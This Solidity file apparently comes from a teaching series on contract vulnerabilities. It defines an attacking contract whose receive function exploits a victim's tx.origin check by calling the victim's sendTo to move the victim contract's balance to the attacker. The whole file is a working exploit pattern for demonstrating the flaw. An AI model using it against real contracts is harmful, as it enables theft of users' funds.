// SPDX-License-Identifier: MIT
pragma solidity 0.8.12;

import "./05_TxOrigin.sol";

contract AttackingContract {

    MyContract public myContract;
    address public attacker;

    function attackingContract(address payable myContractAddress) public {
        myContract = MyContract(myContractAddress);
        attacker = msg.sender;
    }

    receive() external payable{
        myContract.sendTo(payable(attacker), msg.sender.balance);
    }

}
